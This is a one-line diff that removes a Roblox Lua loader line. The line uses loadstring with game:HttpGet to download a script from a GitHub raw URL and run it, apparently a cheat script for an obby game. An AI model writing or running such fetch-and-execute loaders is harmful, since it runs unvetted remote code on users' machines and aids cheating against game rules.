@@ -1,1 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SmartHammerAnimate/loaders/main/loaders/1-2-player-grapple-cart-obby-spam1-fgfuwytro9iuzo.lua"))()
